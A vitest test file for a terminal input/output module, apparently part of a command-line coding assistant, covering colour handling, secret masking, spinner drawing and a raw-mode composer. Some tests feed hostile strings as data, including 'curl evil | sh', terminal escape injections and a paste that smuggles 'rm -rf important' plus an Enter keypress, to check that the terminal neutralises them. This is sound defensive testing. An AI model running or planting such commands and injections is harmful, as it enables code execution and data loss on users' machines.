import { describe, it, expect } from 'vitest'
import { ULTRATHINK_HINT, ULTRATHINK_HINT_ALREADY, ULTRATHINK_HINT_NONE } from '@shared/ultrathink'
import { createInterface } from 'node:readline'
import { PassThrough } from 'node:stream'
import { EventEmitter } from 'node:events'
import {
  resolveColor,
  createTerminalIo,
  marksByLine,
  physicalCursorRow,
  pickerPhysicalRows,
  SYNC_BEGIN,
  SYNC_END,
  type ReadlineLike
} from './tui-io'
import type { PagerSource } from './tui-pager'
import { visibleWidth } from './tui-wrap'
import { makePainter } from './tui'
import { renderCommandMenu } from './tui-complete'

// Built from a char code: a literal ESC in a regex trips eslint's no-control-regex.
const ESC = String.fromCharCode(27)
/** Cursor moves and carriage returns, which take no columns of their own. */
const CSI_MOVES = new RegExp(`${ESC}\\[[0-9;?]*[A-Za-z]|\\r`, 'g')
/** The picker's redraw: back to column 0, up over its rows, erase to the end. */
const PICKER_REDRAW = new RegExp(`\\r${ESC}\\[\\d+A${ESC}\\[0J`)
const CURSOR_UP = new RegExp(`${ESC}\\[(\\d+)A`, 'g')
/** A foreground colour (standard, bright, or 256-colour); dim and bold are not colour. */
const COLOUR = new RegExp(`${ESC}\\[(3[0-7]|9[0-7]|38;)`)
/** Text with its SGR codes removed (for asserting on content). */
const stripSgr = (s: string): string => s.replace(new RegExp(`${ESC}\\[[0-9;]*m`, 'g'), '')

describe('resolveColor', () => {
  it('requires a TTY by default', () => {
    expect(resolveColor({}, true)).toBe(true)
    expect(resolveColor({}, false)).toBe(false)
  })

  it('disables color whenever NO_COLOR is present (any value, per spec)', () => {
    expect(resolveColor({ NO_COLOR: '1' }, true)).toBe(false)
    expect(resolveColor({ NO_COLOR: '' }, true)).toBe(false) // empty still counts
  })

  it('disables color for a dumb terminal', () => {
    expect(resolveColor({ TERM: 'dumb' }, true)).toBe(false)
  })

  it('FORCE_COLOR forces color on even without a TTY', () => {
    expect(resolveColor({ FORCE_COLOR: '1' }, false)).toBe(true)
    // FORCE_COLOR='0' is not a force; a TTY still gets color on its own merit.
    expect(resolveColor({ FORCE_COLOR: '0' }, true)).toBe(true)
  })

  it('FORCE_COLOR=0/false does not force, and NO_COLOR wins over FORCE_COLOR', () => {
    expect(resolveColor({ FORCE_COLOR: '0' }, false)).toBe(false)
    expect(resolveColor({ FORCE_COLOR: 'false' }, false)).toBe(false)
    expect(resolveColor({ NO_COLOR: '1', FORCE_COLOR: '1' }, true)).toBe(false)
  })
})

/** A fake readline interface recording the pause/resume/question lifecycle. */
function fakeRl() {
  const events: Record<string, Array<() => void>> = {}
  const calls: string[] = []
  let answer: ((a: string) => void) | null = null
  const rl: ReadlineLike = {
    question: (_q, _opts, cb) => {
      calls.push('question')
      answer = cb
    },
    pause: () => calls.push('pause'),
    resume: () => calls.push('resume'),
    on: (event, cb) => {
      ;(events[event] ??= []).push(cb)
    },
    close: () => calls.push('close')
  }
  return {
    rl,
    calls,
    submit: (a: string) => answer?.(a),
    fire: (event: string) => (events[event] ?? []).forEach((cb) => cb())
  }
}

describe('createTerminalIo output seam', () => {
  it('passes colours but shows any other control a string carries, before it reaches the terminal', () => {
    const writes: string[] = []
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: (s) => writes.push(s), drainInput: () => {} })
    io.out('\x1b[32mok\x1b[0m curl evil | sh # \r\x1b[2Kls -la \x1b]52;c;eA==\x07\n')
    const out = writes.join('')
    expect(out).toContain('\x1b[32mok\x1b[0m')
    expect(out).not.toContain('\r')
    expect(out).not.toContain('\x1b[2K')
    expect(out).not.toContain('\x1b]52')
    expect(out).toContain('curl evil | sh # <U+000D><U+001B>[2Kls -la')
  })

  it('filters a read prompt and the spinner label too', () => {
    const writes: string[] = []
    const f = fakeRl()
    let asked = ''
    f.rl.question = (q, _o, _cb) => {
      asked = q
    }
    const io = createTerminalIo({
      createInterface: () => f.rl,
      write: (s) => writes.push(s),
      drainInput: () => {},
      // Draw one spinner frame as soon as the timer starts.
      schedule: (fn) => {
        fn()
        return () => {}
      }
    })
    void io.readLine('field\x1b]0;pwned\x07: ')
    expect(asked).toBe('field<U+001B>]0;pwned<U+0007>: ')
    io.startSpinner?.('Run\x1b[2J')
    io.stopSpinner?.()
    expect(writes.join('')).toContain('Run<U+001B>[2J')
    expect(writes.join('')).not.toContain('\x1b[2J')
  })
})

describe('createTerminalIo lifecycle', () => {
  it('starts paused so idle keystrokes are not echoed', () => {
    const f = fakeRl()
    createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    expect(f.calls).toEqual(['pause'])
  })

  it('resumes for a read and pauses again once the line is submitted', async () => {
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    const p = io.readLine('› ')
    // resume + question happen synchronously when the read starts.
    expect(f.calls).toEqual(['pause', 'resume', 'question'])
    f.submit('hello')
    await expect(p).resolves.toBe('hello')
    // and it pauses again afterwards.
    expect(f.calls).toEqual(['pause', 'resume', 'question', 'pause'])
  })

  it('drains buffered input before a discardPending (sensitive) read', () => {
    const f = fakeRl()
    let drained = 0
    const io = createTerminalIo({
      createInterface: () => f.rl,
      write: () => {},
      drainInput: () => {
        drained++
      }
    })
    io.readLine('> ', { discardPending: true })
    expect(drained).toBe(1)
    // a normal read does NOT drain (type-ahead for the composer is fine).
    io.readLine('› ')
    expect(drained).toBe(1)
  })

  it('resolves an outstanding read with null on EOF (close)', async () => {
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    const p = io.readLine('› ')
    f.fire('close')
    await expect(p).resolves.toBeNull()
  })

  it('resolves reads with null once closed, never re-questioning a dead interface', async () => {
    // Guards the ERR_USE_AFTER_CLOSE crash: after EOF at an in-run prompt (Ctrl-D),
    // the driver's next composer read must resolve null (→ clean exit), not call
    // rl.question on a closed interface (which throws).
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    f.fire('close')
    const questionsBefore = f.calls.filter((c) => c === 'question').length
    await expect(io.readLine('> ')).resolves.toBeNull()
    await expect(io.readLine('again')).resolves.toBeNull()
    expect(f.calls.filter((c) => c === 'question').length).toBe(questionsBefore)
  })

  it('readSecret (off-TTY fallback) still resolves a submitted value', async () => {
    // process.stdin.isTTY is false under vitest, so readSecret degrades to a normal
    // read (the raw-mode masking is MANUAL-VERIFY, like the picker).
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    const p = io.readSecret!('key › ')
    expect(f.calls).toContain('question')
    f.submit('sk-secret')
    await expect(p).resolves.toBe('sk-secret')
  })

  it('readSecret masks input and suppresses readline echo (raw TTY)', async () => {
    // Reproduces the leak where readline software-echoes each typed char next to our
    // mask (b•2•4•…). Stub a fake TTY for process.stdin so the raw-mode path runs.
    const realStdin = process.stdin
    const fake = new EventEmitter() as unknown as NodeJS.ReadStream
    Object.assign(fake, { isTTY: true, setRawMode: () => {}, resume: () => {}, pause: () => {} })
    // A pre-existing readline-style keypress listener that would echo the raw char.
    const echoed: string[] = []
    const readlineEcho = (s: string): void => {
      if (s) echoed.push(s)
    }
    fake.on('keypress', readlineEcho)
    Object.defineProperty(process, 'stdin', { value: fake, configurable: true })
    try {
      const writes: string[] = []
      const f = fakeRl()
      const io = createTerminalIo({
        createInterface: () => f.rl,
        write: (s) => writes.push(s),
        drainInput: () => {}
      })
      const p = io.readSecret!('key › ')
      // readline's echo listener is detached; only readSecret's own handler remains.
      expect(fake.listenerCount('keypress')).toBe(1)
      fake.emit('keypress', 'x', { name: 'x' })
      fake.emit('keypress', '9', { name: '9' })
      fake.emit('keypress', '', { name: 'return' })
      await expect(p).resolves.toBe('x9')
      const out = writes.join('')
      expect(out).toContain('••') // masked, one bullet per char
      expect(out).not.toContain('x') // the real characters never hit the screen
      expect(out).not.toContain('9')
      expect(echoed).toEqual([]) // readline never got to echo them
      // readline's listener is restored so the next read still works.
      expect(fake.listeners('keypress')).toContain(readlineEcho)
    } finally {
      Object.defineProperty(process, 'stdin', { value: realStdin, configurable: true })
    }
  })

  it('readSecret resolves null on close instead of hanging', async () => {
    // Regression (R2): a masked prompt must not outlive the interface. If stdin closes
    // while `key ›` is up, the read has to settle to null, not hang the /login loop.
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    const p = io.readSecret!('key › ')
    f.fire('close')
    await expect(p).resolves.toBeNull()
  })

  it('cancelRead resolves the pending read with null and pauses', async () => {
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    const p = io.readLine('> ')
    io.cancelRead?.()
    await expect(p).resolves.toBeNull()
    expect(f.calls.filter((c) => c === 'pause')).toHaveLength(2) // initial + cancel
  })

  it('cancelRead cancels the underlying question so the next read is not corrupted', async () => {
    // Regression: uses a REAL node:readline (the fake can't reproduce it). Before
    // the AbortSignal fix, cancelRead left the first rl.question registered, so
    // the next read reused its stale prompt and delivered the user's line to the
    // dead callback — the new read never resolved.
    const input = new PassThrough()
    const output = new PassThrough()
    output.resume() // drain readline's escape output
    const io = createTerminalIo({
      createInterface: () =>
        createInterface({ input, output, terminal: true }) as unknown as ReadlineLike,
      write: () => {},
      drainInput: () => {}
    })
    // An approval-style read, then a Ctrl-C cancel of it.
    const first = io.readLine('APPROVE> ')
    io.cancelRead?.()
    await expect(first).resolves.toBeNull()
    // The next composer read must receive the user's line (not the abandoned one).
    const second = io.readLine('compose> ')
    input.write('hello world\n')
    await expect(second).resolves.toBe('hello world')
  })

  it('registers SIGINT and close handlers', () => {
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    let interrupted = false
    io.onInterrupt?.(() => {
      interrupted = true
    })
    f.fire('SIGINT')
    expect(interrupted).toBe(true)
  })

  it('select() falls back to typing when there is no TTY (the test env)', async () => {
    const f = fakeRl()
    const io = createTerminalIo({ createInterface: () => f.rl, write: () => {}, drainInput: () => {} })
    // process.stdin.isTTY is false under vitest → the picker can't run, so it
    // returns `type` and the driver uses the typed prompt instead.
    const r = await io.select?.({ title: 'x', options: [{ label: 'A', value: 'a' }] })
    expect(r).toEqual({ kind: 'type' })
  })
})

/** A controllable scheduler + clock + output capture for spinner tests. */
function spinnerHarness() {
  const writes: string[] = []
  let ticks: Array<() => void> = []
  let nowMs = 1000
  const f = fakeRl()
  const io = createTerminalIo({
    createInterface: () => f.rl,
    write: (s) => writes.push(s),
    drainInput: () => {},
    now: () => nowMs,
    schedule: (fn) => {
      ticks.push(fn)
      return () => {
        ticks = ticks.filter((t) => t !== fn)
      }
    }
  })
  return {
    io,
    f,
    writes,
    text: () => writes.join(''),
    tick: () => ticks.forEach((fn) => fn()),
    scheduled: () => ticks.length,
    advance: (ms: number) => {
      nowMs += ms
    }
  }
}

describe('createTerminalIo spinner, reduced motion', () => {
  function harness() {
    const writes: string[] = []
    const intervals: number[] = []
    let ticks: Array<() => void> = []
    let nowMs = 1000
    const io = createTerminalIo({
      createInterface: () => fakeRl().rl,
      write: (s) => writes.push(s),
      drainInput: () => {},
      now: () => nowMs,
      schedule: (fn, ms) => {
        intervals.push(ms)
        ticks.push(fn)
        return () => {
          ticks = ticks.filter((t) => t !== fn)
        }
      }
    })
    return {
      io,
      intervals,
      text: () => writes.join(''),
      tick: () => ticks.forEach((fn) => fn()),
      advance: (ms: number) => {
        nowMs += ms
      }
    }
  }

  it('draws a still mark at once and refreshes only every few seconds', () => {
    const h = harness()
    h.io.setAccessibility!({ reduceMotion: true })
    h.io.startSpinner!('Working')
    expect(h.intervals).toEqual([5000])
    expect(h.text()).toContain('• Working 0s')
    h.advance(5000)
    h.tick()
    h.advance(5000)
    h.tick()
    // Every frame is the same mark: no braille animation frames at all.
    expect(h.text()).toContain('• Working 10s')
    expect(h.text()).not.toMatch(/[⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏]/)
  })

  it('switching it mid-run restarts the timer at the new pace', () => {
    const h = harness()
    h.io.startSpinner!('Working')
    expect(h.intervals).toEqual([100])
    h.io.setAccessibility!({ reduceMotion: true })
    expect(h.intervals).toEqual([100, 5000])
    h.io.setAccessibility!({ reduceMotion: false })
    expect(h.intervals).toEqual([100, 5000, 100])
  })
})

describe('createTerminalIo spinner', () => {
  it('schedules a redraw on start and draws the label + elapsed', () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    expect(h.scheduled()).toBe(1)
    h.tick()
    expect(h.text()).toContain('Working')
    expect(h.text()).toContain('0s')
    expect(h.text()).toContain('\r') // single-line redraw
  })

  it('advances the elapsed timer', () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    h.advance(3000)
    h.tick()
    expect(h.text()).toContain('3s')
  })

  it('relabels via setSpinnerLabel', () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    h.io.setSpinnerLabel?.('read_file')
    h.tick()
    expect(h.text()).toContain('read_file')
  })

  it('clears the spinner line before real output', () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    h.io.out('hello\n')
    // A clear precedes the real text.
    expect(h.text().indexOf('\x1b[2K')).toBeLessThan(h.text().indexOf('hello'))
  })

  // Reasoning arrives in fragments that seldom end a line, and each frame used to
  // start by erasing its line: "I need" / " to check how" left only the last word.
  it('never erases a line of output that has not ended', () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    h.tick()
    h.io.out('I need')
    h.io.out(' to check how') // continues the line, no erase in between
    expect(h.text()).toContain('I need to check how')
    h.tick() // the next frame goes on a fresh line below it
    const after = h.text().slice(h.text().indexOf('to check how') + 'to check how'.length)
    expect(after.startsWith('\n')).toBe(true)
    expect(after).toContain('Working')
    // A line ended under a colour reset counts as ended: no blank line before the frame.
    h.io.out('\x1b[2mdone.\n\x1b[0m')
    const mark = h.text().length
    h.tick()
    expect(h.text().slice(mark).startsWith('\r\x1b[2K')).toBe(true)
  })

  it('leaves a half-written line on screen when the spinner stops or a prompt opens', async () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    h.io.out('partial')
    h.io.stopSpinner?.()
    h.io.startSpinner?.('Working')
    const p = h.io.readLine('> ')
    const after = h.text().slice(h.text().indexOf('partial') + 'partial'.length)
    expect(after).not.toContain('\x1b[2K')
    expect(after).toBe('\n') // the prompt starts below it
    h.f.submit('y')
    await p
  })

  it('leaves the spinner on screen when there is nothing to print', () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    h.tick()
    const drawn = h.text()
    // A text delta the streaming renderer is still holding arrives as ''.
    h.io.out('')
    h.io.out('')
    expect(h.text()).toBe(drawn)
  })

  it('stops: cancels the timer and erases the line', () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    expect(h.scheduled()).toBe(1)
    h.io.stopSpinner?.()
    expect(h.scheduled()).toBe(0)
    expect(h.text()).toContain('\x1b[2K')
  })

  it('stops the spinner while a picker is on screen', async () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    expect(h.text()).toBe('') // scheduled, but nothing drawn until the first tick
    // select() erases the spinner line before showing the picker (like readLine),
    // then the no-TTY test env falls back to `type`.
    const r = await h.io.select?.({ title: 'x', options: [{ label: 'A', value: 'a' }] })
    expect(r).toEqual({ kind: 'type' })
    expect(h.text()).toContain('\x1b[2K') // spinner line erased for the picker
    expect(h.scheduled()).toBe(1) // and the spinner resumes (turn still active)
  })

  it('pauses the spinner during a read and resumes after', async () => {
    const h = spinnerHarness()
    h.io.startSpinner?.('Working')
    const p = h.io.readLine('> ', { discardPending: true })
    // Reading pauses the redraw timer while the prompt is on screen.
    expect(h.scheduled()).toBe(0)
    h.f.submit('y')
    await p
    // Turn still active → spinner resumes.
    expect(h.scheduled()).toBe(1)
  })
})

/**
 * A fake TTY stdin: a PassThrough that claims to be a terminal and records raw-mode
 * transitions. Lets the raw-mode composer be driven end to end (real decoder, real
 * editor, real redraw) with no actual terminal, which is where the paste bug lived.
 */
function fakeTty() {
  const rawModes: boolean[] = []
  const s = new PassThrough() as unknown as NodeJS.ReadStream
  s.isTTY = true
  s.setRawMode = ((on: boolean) => {
    rawModes.push(on)
    return s
  }) as NodeJS.ReadStream['setRawMode']
  return Object.assign(s, { rawModes })
}

describe('readComposer (raw-mode composer)', () => {
  function harness(over: Parameters<typeof createTerminalIo>[0] = {}) {
    const stdin = fakeTty()
    const written: string[] = []
    // A controllable clock: the composer treats keys arriving within 50ms of paste
    // bytes as clipboard content, so a test standing in for a human must let time
    // pass between pasting and pressing Enter (see sanitizePastedKeys).
    let clock = 1000
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: (s) => written.push(s),
      columns: () => 80,
      now: () => clock,
      ...over
    })
    return {
      io,
      stdin,
      written,
      text: () => written.join(''),
      /** Advance the clock, standing in for a human's pause before the next key. */
      tick: (ms = 500) => {
        clock += ms
      }
    }
  }

  it('repaints when menu rows arrive after the keystroke (an @ file lookup)', async () => {
    let late: string[] = []
    let redraw: (() => void) | null = null
    const t = harness({
      menuFor: (l, r) => {
        redraw = r
        return l.includes('@') ? late : []
      }
    })
    const read = t.io.readComposer!('> ')
    t.stdin.push('see @gre')
    expect(t.text()).not.toContain('@src/greet.js')
    late = ['  @src/greet.js']
    redraw!()
    expect(t.text()).toContain('@src/greet.js')
    t.stdin.push('\r')
    await read
    // Once the read is over a late answer draws nothing.
    const before = t.text()
    redraw!()
    expect(t.text()).toBe(before)
  })

  it('repaints at the new width when the terminal is resized, climbing the rewrapped rows', async () => {
    let cols = 80
    let resize: (() => void) | null = null
    let unsubscribed = 0
    const t = harness({
      columns: () => cols,
      onResize: (l) => {
        resize = l
        return () => {
          unsubscribed++
          resize = null
        }
      }
    })
    const read = t.io.readComposer!('> ')
    // One logical row of 42 cells (prompt + 40 chars), cursor at its end.
    t.stdin.push('x'.repeat(40))
    expect(resize).not.toBeNull()
    const before = t.written.length
    // Narrowed to 20 columns: the terminal rewrapped that row onto three, and the
    // cursor (column 42) now sits two rows below the top of the draw.
    cols = 20
    resize!()
    const repaint = t.written.slice(before).join('')
    expect(repaint.startsWith('\x1b[2A\r\x1b[0J')).toBe(true)
    // Redrawn at the new width: no row is wider than it.
    const lastDraw = repaint.slice(repaint.lastIndexOf('\x1b[0J') + 4)
    // eslint-disable-next-line no-control-regex
    const moves = /\x1b\[\d*[A-Z]|\r/g
    for (const row of lastDraw.split('\n')) expect(visibleWidth(row.replace(moves, ''))).toBeLessThan(20)
    expect(lastDraw).toContain('x')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('x'.repeat(40))
    // The read is over: the listener is gone, and a late resize draws nothing.
    expect(unsubscribed).toBe(1)
  })

  it('counts the physical rows a resize leaves above the cursor', () => {
    // Rows that still fit take one row each.
    expect(physicalCursorRow(['> ab', '… cd'], 1, 4, 80)).toBe(1)
    // A 25-cell row on a 10-column terminal takes three; the cursor at column 15 of
    // the next row is one row into it.
    expect(physicalCursorRow(['y'.repeat(25), 'z'.repeat(20)], 1, 15, 10)).toBe(4)
    // Colour codes take no cells, and an empty row still takes one.
    expect(physicalCursorRow(['\x1b[36m> \x1b[0m', ''], 1, 0, 5)).toBe(1)
  })

  it('leaves only the submitted line in the scrollback, not the command menu under it', async () => {
    const t = harness({ menuFor: (l) => (l.startsWith('/') ? ['  /changes  What is different in the working tree'] : []) })
    const read = t.io.readComposer!('> ')
    t.stdin.push('/changes')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('/changes')
    // The live menu was drawn while typing; the final echo after the last erase must
    // carry the prompt and text only.
    const out = t.text()
    const finalEcho = out.slice(out.lastIndexOf('\x1b[0J') + '\x1b[0J'.length)
    expect(finalEcho).toContain('/changes')
    expect(finalEcho).not.toContain('What is different')
  })

  // A background session's notice lands whenever that session ends. Written into the
  // open composer, it left the half-typed line above it looking sent, and an open menu
  // erased part of it on the next keystroke.
  it('prints output that arrives while it is open above it, and draws the draft again below', async () => {
    const t = harness({ menuFor: (l) => (l.startsWith('/') ? ['  /help   list commands'] : []) })
    const read = t.io.readComposer!('ask › ')
    t.stdin.push('/he')
    const mark = t.text().length
    t.io.out('\n· background session "fix tests" finished. Resume it to see the result\n')
    const after = t.text().slice(mark)
    const notice = after.indexOf('· background session')
    // The composer and its menu are erased before the notice is written...
    expect(after.slice(0, notice)).toContain('\r\x1b[0J')
    expect(after.slice(0, notice)).not.toContain('ask ›')
    // ...and drawn again under it, draft and menu intact.
    expect(after.slice(notice)).toContain('ask › /he')
    expect(after.slice(notice)).toContain('/help   list commands')
    t.tick()
    t.stdin.push('lp\r')
    await expect(read).resolves.toBe('/help')
    // Once the composer is closed, output goes straight to the transcript again.
    const closed = t.text().length
    t.io.out('later\n')
    expect(t.text().slice(closed)).toBe('later\n')
  })

  it('shows the ultrathink hint under the draft, and keeps it out of the scrollback', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push('fix it, ultrathink')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('fix it, ultrathink')
    const out = t.text()
    expect(out).toContain(ULTRATHINK_HINT)
    const finalEcho = out.slice(out.lastIndexOf('\x1b[0J') + '\x1b[0J'.length)
    expect(finalEcho).toContain('fix it, ultrathink')
    expect(finalEcho).not.toContain(ULTRATHINK_HINT)
  })

  it('words the hint by what the keyword will do, read fresh on each draw', async () => {
    const t = harness()
    let effect: 'already' | 'none' = 'already'
    const read = t.io.readComposer!('> ', undefined, { ultrathinkEffect: () => effect })
    t.stdin.push('ultrathink')
    effect = 'none'
    t.stdin.push('!')
    t.stdin.push('\r')
    await read
    const out = t.text()
    expect(out).toContain(ULTRATHINK_HINT_ALREADY)
    expect(out).toContain(ULTRATHINK_HINT_NONE)
    expect(out).not.toContain(ULTRATHINK_HINT)
  })

  it('shows no ultrathink hint for a draft that only mentions the word', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push('open ultrathink.ts')
    t.stdin.push('\r')
    await expect(read).resolves.toBe('open ultrathink.ts')
    expect(t.text()).not.toContain(ULTRATHINK_HINT)
  })

  it('submits a typed line on Enter', async () => {
    const { io, stdin } = harness()
    const read = io.readComposer!('> ')
    stdin.push('hello')
    stdin.push('\r')
    await expect(read).resolves.toBe('hello')
  })

  // The regression this whole path exists for: a pasted block must arrive as one
  // message, not submit its first line and replay the rest.
  it('lands a bracketed multi-line paste as ONE message', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push('\x1b[200~first line\nsecond line\nthird line\x1b[201~')
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toBe('first line\nsecond line\nthird line')
  })

  it('expands a collapsed big paste on submit', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    const body = Array.from({ length: 30 }, (_, i) => `line ${i}`).join('\n')
    t.stdin.push(`\x1b[200~${body}\x1b[201~`)
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toBe(body)
  })

  it('enables bracketed paste while reading and disables it on the way out', async () => {
    const { io, stdin, text } = harness()
    const read = io.readComposer!('> ')
    expect(text()).toContain('\x1b[?2004h')
    stdin.push('x\r')
    await read
    expect(text()).toContain('\x1b[?2004l')
  })

  it('asks for modified-key reports while reading (Shift-Enter), and stops after', async () => {
    const { io, stdin, text } = harness()
    const read = io.readComposer!('> ')
    expect(text()).toContain('\x1b[>4;1m')
    stdin.push('one')
    stdin.push('\x1b[27;2;13~')
    stdin.push('two')
    stdin.push('\r')
    await expect(read).resolves.toBe('one\ntwo')
    expect(text()).toContain('\x1b[>4;0m')
  })

  it('enters raw mode for the read and restores cooked mode after', async () => {
    const { io, stdin } = harness()
    const read = io.readComposer!('> ')
    stdin.push('x\r')
    await read
    expect(stdin.rawModes).toEqual([true, false])
  })

  it('edits with emacs keys before submitting', async () => {
    const { io, stdin } = harness()
    const read = io.readComposer!('> ')
    stdin.push('world')
    stdin.push('\x01') // Ctrl-A: start of line
    stdin.push('hello ')
    stdin.push('\r')
    await expect(read).resolves.toBe('hello world')
  })

  it('recalls history with Up', async () => {
    const { io, stdin } = harness({ history: () => ['earlier message'] })
    const read = io.readComposer!('> ')
    stdin.push('\x1b[A')
    stdin.push('\r')
    await expect(read).resolves.toBe('earlier message')
  })

  it('builds a multi-line message with Ctrl-J', async () => {
    const { io, stdin } = harness()
    const read = io.readComposer!('> ')
    stdin.push('one\ntwo\r')
    await expect(read).resolves.toBe('one\ntwo')
  })

  it('resolves null on Ctrl-D at an empty composer', async () => {
    const { io, stdin } = harness()
    const read = io.readComposer!('> ')
    stdin.push('\x04')
    await expect(read).resolves.toBeNull()
  })

  it('routes Ctrl-C through the interrupt handler and resolves null', async () => {
    const { io, stdin } = harness()
    let fired = 0
    io.onInterrupt?.(() => fired++)
    const read = io.readComposer!('> ')
    stdin.push('abandoned draft')
    stdin.push('\x03')
    await expect(read).resolves.toBeNull()
    expect(fired).toBe(1)
  })

  it('completes a slash command on Tab', async () => {
    const { io, stdin } = harness({
      completer: (line, cb) => cb(null, [['/help '], line])
    })
    const read = io.readComposer!('> ')
    stdin.push('/he')
    stdin.push('\t')
    await new Promise((r) => setImmediate(r)) // the completer round trip is async
    stdin.push('\r')
    // The trailing space comes from the completion itself, so the next token can
    // just be typed; the driver trims the submitted line.
    await expect(read).resolves.toBe('/help ')
  })

  it('prints ambiguous completions only when no live menu already lists them', async () => {
    const completer = (line: string, cb: (err: null, result: [string[], string]) => void): void =>
      cb(null, [['/redo ', '/review '], line])
    const tab = async (t: ReturnType<typeof harness>): Promise<void> => {
      const read = t.io.readComposer!('> ')
      t.stdin.push('/re')
      t.stdin.push('\t')
      await new Promise((r) => setImmediate(r)) // the completer round trip is async
      t.stdin.push('\r')
      await read
    }
    // The slash-command menu under the composer already shows both: Tab prints nothing.
    const withMenu = harness({ completer, menuFor: (l) => (l.startsWith('/') ? ['  /redo', '  /review'] : []) })
    await tab(withMenu)
    expect(withMenu.text()).not.toContain('/redo  /review')
    // With no menu (an @-file mention), the candidates are printed so they can be seen.
    const noMenu = harness({ completer })
    await tab(noMenu)
    expect(noMenu.text()).toContain('/redo  /review')
  })

  it('hands the draft to $EDITOR on Ctrl-X Ctrl-E and takes back the result', async () => {
    const { io, stdin } = harness({
      editText: async (initial) => `${initial} (edited)`
    })
    const read = io.readComposer!('> ')
    stdin.push('draft')
    stdin.push('\x18\x05')
    await new Promise((r) => setImmediate(r)) // the editor round trip is async
    stdin.push('\r')
    await expect(read).resolves.toBe('draft (edited)')
  })

  it('searches history with Ctrl-R', async () => {
    const { io, stdin } = harness({ history: () => ['run the tests', 'git status'] })
    const read = io.readComposer!('> ')
    stdin.push('\x12') // Ctrl-R
    stdin.push('tests')
    stdin.push('\r') // accept the match
    stdin.push('\r') // submit it
    await expect(read).resolves.toBe('run the tests')
  })

  it('redraws only its own rows — never a full-screen clear', async () => {
    const { io, stdin, text } = harness()
    const read = io.readComposer!('> ')
    stdin.push('abc')
    stdin.push('\r')
    await read
    expect(text()).not.toContain('\x1b[2J') // no screen clear
    expect(text()).toContain('\x1b[0J') // bounded erase-to-end only
  })

  it('falls back to the readline prompt when stdin is not a TTY', async () => {
    const plain = new PassThrough() as unknown as NodeJS.ReadStream
    plain.isTTY = false
    const rl = fakeRl()
    const io = createTerminalIo({ stdin: plain, createInterface: () => rl.rl, write: () => {} })
    const read = io.readComposer!('> ')
    rl.submit('typed via readline')
    await expect(read).resolves.toBe('typed via readline')
  })
})

/**
 * A paste body is attacker-controlled (text copied from a web page, a file, an
 * issue comment). If it carries its own ESC[201~ it ends paste mode early, and
 * anything after that marker would decode as real keystrokes. These pin the
 * defense: within the post-paste window nothing but content survives.
 */
describe('readComposer — hostile paste content', () => {
  function harness() {
    const stdin = fakeTty()
    let clock = 1000
    let spawnedEditor = 0
    const io = createTerminalIo({
      stdin,
      createInterface: () => fakeRl().rl,
      write: () => {},
      columns: () => 80,
      now: () => clock,
      editText: async (t) => {
        spawnedEditor++
        return t
      }
    })
    return {
      io,
      stdin,
      editorSpawns: () => spawnedEditor,
      tick: (ms = 500) => {
        clock += ms
      }
    }
  }
  const START = '\x1b[200~'
  const END = '\x1b[201~'

  it('does not submit a turn from a CR smuggled after an embedded end marker', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    // The clipboard payload closes paste mode itself, then "presses Enter".
    t.stdin.push(`${START}rm -rf important${END}\r${END}`)
    // Nothing resolved: the CR became a line break, not a submission.
    const raced = await Promise.race([read, Promise.resolve('still-open')])
    expect(raced).toBe('still-open')
    // The human's own Enter, later, submits — and the payload is visibly just text.
    t.tick()
    t.stdin.push('\r')
    await expect(read).resolves.toContain('rm -rf important')
  })

  it('does not submit when the smuggled CR arrives in a later chunk', async () => {
    // Chunk boundaries are attacker-influenceable (a TTY splits at its buffer
    // size), so the guard cannot rely on the CR sharing a chunk with the paste.
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push(`${START}payload${END}`)
    t.stdin.push(`\r${END}`)
    const raced = await Promise.race([read, Promise.resolve('still-open')])
    expect(raced).toBe('still-open')
  })

  it('does not spawn $EDITOR from a smuggled Ctrl-X Ctrl-E', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push(`${START}payload${END}\x18\x05${END}`)
    await new Promise((r) => setImmediate(r))
    expect(t.editorSpawns()).toBe(0)
    t.tick()
    t.stdin.push('\r')
    await read
  })

  it('does not quit the session from a smuggled Ctrl-D', async () => {
    const t = harness()
    const read = t.io.readComposer!('> ')
    t.stdin.push(`${START}${END}\x04${END}`)
    const raced = await Promise.race([read, Promise.resolve('still-open')])
    expect(raced).toBe('still-open')
  })

